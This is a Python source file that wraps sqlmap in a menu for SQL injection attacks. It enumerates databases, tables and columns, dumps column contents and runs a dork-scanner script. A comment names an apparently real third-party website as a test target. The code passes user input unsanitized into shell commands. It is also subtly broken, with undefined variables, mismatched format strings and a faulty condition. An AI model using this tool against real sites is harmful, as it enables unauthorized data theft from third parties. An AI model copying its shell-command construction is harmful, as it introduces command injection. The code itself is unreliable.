import os
import sys
import time
import re
import linecache
from clear import clear
from logo import *


def start():    
    with open('sql/customArgs.py') as f:
        global customArgs
        customArgs = f.read()
    with open('sql/target.py') as f:
        global target
        target = f.read()
    with open('sql/sqlmapdir.py') as f:
        global sqlmapdir
        sqlmapdir = f.read()
    clear()
    menu()

#### TEST: http://berkeleyrecycling.org/page.php?id=1 ###
def scan():
    global sqlmapdir
    global target
    global customArgs
    os.system ( sqlmapdir + str(target + '--dbs --random-agent --batch ' + customArgs ) )
    tables = input("Check For Tables? [y/n/back] : ")
    if str(tables) == "y" or str(tables) == "Y":
        scanned(a)
    elif str(tables) == "back" or str(tables == "BACK"):
        menu()

def scanned():
    os.system ( sqlmapdir + target + ' --dbs --tables --random-agent --batch %s %s ' % (customArgs)) 
    columns = input("Check for Columns in a table? [y/n/back] : ")
    if str(columns) == "y" or str(columns) == "Y":
        global table
        table = input("What Table do you wish to pull from: ")
        os.system ( sqlmapdir + target + '--dbs %s %s -T %s --columns' % (customArgs, table)) 
        dump = input("would you like to dump a Column? [y/n/back] : ")
        if str(dump) == "y" or str(dump) == "Y":
            global columned
            print("NOTE: Add ' >> file ' to the end if you wish to output to a file.")
            print("      Data will not display on terminal if you do so.")
            columned = input("What column would you like to dump?")
            scanned(a)
            os.system ( sqlmapdir + target + '--dbs %s -T %s -C %s --dump' % (a, table, columns)) 
        elif str(dump) == "back" or str(dump) == "BACK":
            scanned(a)
    elif str(columns) == "back" or str(columns) == "BACK":
        scanned(a)

    
def menu():
    logo2()
    global customArgs
    global target
    global sqlmapdir
    mi = print("Current Target: " + target + BC.F + "     * Global Target Does Not Apply" + BC.G)
    mi = print("Custom Args: " + customArgs)
    mi = print("SQLMap Options")
    mitems2("Dork Scanner", "Init Scan", "Clear Arguments", "Custom Path To SQLMap")
    mi = input("")
    mp = mi[:7]
    mo = mi[8:]
    np = mi[:5]
    no = mi[6:]
    if mi == "1":
        clear()
        logo2()
        os.system("./sql.sh")
        menu()
    elif mi == "2":
        clear()
        logo2()
        scan()
        clear()
        menu()
    elif mi == "3":
        with open('sql/customArgs.py', 'w') as f:
            f.write("")
        f.close()
        customArgs = ""
        clear()
        menu()
    elif mi == "4":
        clear()
        logo2()
        print("Example Paths: " + BC.F + "/usr/bin/sqlmap")
        print("               C:/Program Files/SQLMap/sqlmap.py" + BC.G)
        print("Note: If you have to launch sqlmap using 'python' please add it before the path.")
        print("")
        sqlmapdir = input("Enter your SQLMap file path: ")
        with open('sql/sqlmapdir.py', 'w') as f:
            f.write(sqlmapdir)
        clear()
        menu()
    elif mi == "*":
        clear()
        exit
    elif mi == "0":
        sys.exit()
    elif mp == "!target":
        with open('sql/target.py', 'w') as f:
            f.write(mo)
        target = mo
        clear()
        menu()
    elif mp == "#target":
        target = mo
        clear()
        menu()
    elif np == "#args":
        with open('sql/customArgs.py', 'w') as f:
            f.write(no)
        customArgs = no
        clear()
        menu()
    elif np == "#help":
        clear()
        os.system( sqlmapdir + ' -h' )
        input("Press Enter To Continue...")
        menu()
    elif np == "!help" or mi == "**":
        clear()
        helpm()
        input("Press Enter To Continue...")
        menu()
    else:
        clear()
        print("WHELP! That didn't quite work...")
        time.sleep(1)
        menu()